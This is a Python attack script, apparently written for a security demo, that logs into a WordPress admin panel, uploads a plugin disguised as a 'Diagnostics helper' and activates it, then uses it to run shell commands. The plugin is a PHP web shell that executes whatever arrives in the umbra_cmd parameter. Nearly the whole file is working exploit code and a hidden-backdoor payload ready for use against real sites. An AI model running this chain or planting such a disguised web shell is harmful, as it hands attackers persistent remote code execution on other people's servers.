#!/usr/bin/env python3
"""WordPress admin -> plugin upload -> RCE.

Chain used in the demo:

  1. log in to wp-login.php with credentials obtained during enumeration
  2. build a minimal plugin whose main file executes a command from a query
     parameter
  3. upload it through /wp-admin/update.php?action=upload-plugin
  4. activate it, then call the plugin file to confirm code execution

Everything is standard WordPress functionality; nothing here relies on a
memory-corruption bug. The point of the demo is what happens *after* code
execution, which is where UMBRA comes in.

Usage:
    python3 wp-plugin-rce.py http://192.168.1.51 admin 'Adm1n!Lab2026'
    python3 wp-plugin-rce.py http://192.168.1.51 admin 'Adm1n!Lab2026' --cmd 'id'
"""

import argparse
import io
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import zipfile

TIMEOUT = 30

PLUGIN_SLUG = "umbra-shell"
PLUGIN_NAME = "Umbra Shell"

# The plugin body. `umbra_cmd` is the query parameter that carries the command.
#
# NOTE: this is a plain string with a __NAME__ placeholder, not a .format()
# template. PHP is full of braces, and str.format() would treat every one of
# them as a field, raising KeyError on the first block of code.
PLUGIN_PHP = """<?php
/**
 * Plugin Name: __NAME__
 * Description: Diagnostics helper.
 * Version: 1.0.0
 * Author: Philippe
 */

if (isset($_GET['umbra_cmd'])) {
    header('Content-Type: text/plain');
    $cmd = $_GET['umbra_cmd'];
    $out = array();
    $rc = 0;
    exec($cmd . ' 2>&1', $out, $rc);
    echo implode("\\n", $out);
    exit;
}
"""


class Session:
    """Cookie-aware HTTP client with a browser-ish user agent."""

    def __init__(self, base):
        self.base = base.rstrip("/")
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor()
        )
        self.ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

    def request(self, path, data=None, headers=None, method=None):
        url = path if path.startswith("http") else f"{self.base}{path}"
        hdrs = {"User-Agent": self.ua}
        if headers:
            hdrs.update(headers)
        body = None
        if data is not None:
            if isinstance(data, dict):
                body = urllib.parse.urlencode(data).encode()
                hdrs.setdefault(
                    "Content-Type", "application/x-www-form-urlencoded"
                )
            else:
                body = data
        req = urllib.request.Request(
            url, data=body, headers=hdrs, method=method
        )
        try:
            with self.opener.open(req, timeout=TIMEOUT) as r:
                return r.status, r.read(), dict(r.headers)
        except urllib.error.HTTPError as e:
            try:
                payload = e.read()
            except Exception:
                payload = b""
            return e.code, payload, dict(e.headers or {})

    def get(self, path, **kw):
        return self.request(path, **kw)

    def post(self, path, data, **kw):
        return self.request(path, data=data, **kw)


def build_plugin_zip():
    """Return the bytes of a plugin zip containing one PHP file."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(
            f"{PLUGIN_SLUG}/{PLUGIN_SLUG}.php",
            PLUGIN_PHP.replace("__NAME__", PLUGIN_NAME),
        )
    return buf.getvalue()


def login(sess, user, password):
    print("[*] logging in as", user)

    # WordPress sets a test cookie before accepting the login form.
    sess.get("/wp-login.php")

    status, body, headers = sess.post(
        "/wp-login.php",
        {
            "log": user,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{sess.base}/wp-admin/",
            "testcookie": "1",
        },
    )
    text = body.decode("utf-8", "replace")

    # A successful login redirects to wp-admin; a failure re-renders the form
    # with an error div.
    if "login_error" in text or "ERROR" in text:
        print("[-] login failed")
        return False

    # Confirm by loading a page that requires authentication.
    status, body, _ = sess.get("/wp-admin/")
    text = body.decode("utf-8", "replace")
    if "wp-admin-bar" in text or "Dashboard" in text:
        print("[+] logged in")
        return True

    print("[-] login did not reach the dashboard (HTTP %s)" % status)
    return False


def upload_plugin(sess, zip_bytes):
    print("[*] fetching the upload nonce")

    status, body, _ = sess.get("/wp-admin/plugin-install.php?tab=upload")
    text = body.decode("utf-8", "replace")

    m = re.search(r'name="_wpnonce"\s+value="([^"]+)"', text)
    if not m:
        m = re.search(r'_wpnonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})', text)
    if not m:
        print("[-] could not find _wpnonce on the upload page")
        return False
    nonce = m.group(1)
    print("    nonce:", nonce)

    # Multipart body: _wpnonce, _wp_http_referer, pluginzip
    boundary = "----UmbraBoundary7d91f3"
    parts = []

    def field(name, value):
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n".encode()
        )

    field("_wpnonce", nonce)
    field("_wp_http_referer", "/wp-admin/plugin-install.php?tab=upload")
    parts.append(
        (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="pluginzip"; '
            f'filename="{PLUGIN_SLUG}.zip"\r\n'
            f"Content-Type: application/zip\r\n\r\n"
        ).encode()
        + zip_bytes
        + b"\r\n"
    )
    parts.append(f"--{boundary}--\r\n".encode())
    payload = b"".join(parts)

    print("[*] uploading the plugin")
    status, body, _ = sess.post(
        "/wp-admin/update.php?action=upload-plugin",
        payload,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    text = body.decode("utf-8", "replace")

    if "Plugin installed successfully" in text or "plugin-install" in text:
        print("[+] plugin uploaded")
        return True

    # Some installs report the result on a follow-up page.
    if "already exists" in text:
        print("[!] plugin directory already exists, continuing")
        return True

    print("[-] upload may have failed (HTTP %s)" % status)
    snippet = re.sub(r"\s+", " ", text)[:300]
    print("    response:", snippet)
    return False


def activate_plugin(sess):
    print("[*] activating the plugin")

    status, body, _ = sess.get("/wp-admin/plugins.php")
    text = body.decode("utf-8", "replace")

    # Find the activate link for our plugin.
    m = re.search(
        r'href="([^"]*action=activate[^"]*plugin='
        + re.escape(PLUGIN_SLUG)
        + r'[^"]*)"',
        text,
    )
    if not m:
        print("[-] activate link not found; the plugin may already be active")
        return True

    link = m.group(1).replace("&amp;", "&")
    if link.startswith("/"):
        link = sess.base + link

    status, body, _ = sess.get(link)
    text = body.decode("utf-8", "replace")
    if "Plugin activated" in text or "plugins.php" in text:
        print("[+] plugin activated")
        return True

    print("[-] activation uncertain (HTTP %s)" % status)
    return False


def run_command(sess, cmd):
    path = f"/wp-content/plugins/{PLUGIN_SLUG}/{PLUGIN_SLUG}.php"
    query = urllib.parse.urlencode({"umbra_cmd": cmd})
    status, body, _ = sess.get(f"{path}?{query}")
    return status, body.decode("utf-8", "replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base")
    ap.add_argument("user")
    ap.add_argument("password")
    ap.add_argument("--cmd", default="id; hostname; uname -a")
    args = ap.parse_args()

    sess = Session(args.base)

    if not login(sess, args.user, args.password):
        return 1

    if not upload_plugin(sess, build_plugin_zip()):
        return 1

    if not activate_plugin(sess):
        return 1

    print()
    print("[*] executing:", args.cmd)
    status, out = run_command(sess, args.cmd)
    print(f"    HTTP {status}")
    print("    --- output ---")
    for line in out.splitlines():
        print("    " + line)

    if "uid=" in out or "root" in out or "www-data" in out:
        print()
        print("[+] RCE CONFIRMED")
        print(f"    webshell: {sess.base}/wp-content/plugins/"
              f"{PLUGIN_SLUG}/{PLUGIN_SLUG}.php?umbra_cmd=id")
        return 0

    print()
    print("[-] no command output; check the plugin state manually")
    return 1


if __name__ == "__main__":
    sys.exit(main())
